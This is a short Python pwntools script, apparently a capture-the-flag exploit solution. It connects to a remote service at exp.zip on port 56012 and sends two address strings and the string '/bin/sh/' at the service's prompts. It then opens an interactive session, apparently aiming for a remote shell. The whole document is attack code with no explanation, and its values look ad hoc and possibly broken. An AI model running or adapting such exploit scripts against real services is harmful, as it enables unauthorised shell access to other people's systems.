from pwn import *


r = remote("exp.zip", 56012)

addr1 = b'404040'
addr2 = b'404028'
addr3 = b'/bin/sh/'

r.recvuntil(b"addr1:")

r.sendline(addr1)

r.recvuntil(b"addr2:")

r.sendline(addr2)


r.recvuntil(b"addr1:")

r.sendline(addr3)



r.interactive()
